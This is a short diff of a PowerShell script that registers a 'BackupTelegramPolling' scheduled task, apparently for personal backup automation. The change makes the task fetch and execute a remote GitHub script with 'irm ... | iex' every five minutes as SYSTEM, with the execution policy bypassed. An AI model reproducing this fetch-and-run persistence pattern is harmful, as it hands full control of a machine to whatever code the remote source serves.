@@ -1,9 +1,9 @@
 # === CONFIG ===
-$scriptPath = "https://raw.githubusercontent.com/Atlas2590/script-command/refs/heads/main/BackupTelegram.ps1"
+$scriptPath = "irm https://raw.githubusercontent.com/Atlas2590/script-command/refs/heads/main/BackupTelegram.ps1 | iex"
 $taskName = "BackupTelegramPolling"
 
 # === CREA LA TASK CHE ESEGUE LO SCRIPT OGNI 5 MINUTI ===
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command `"$scriptPath`""
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Hours 23)
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
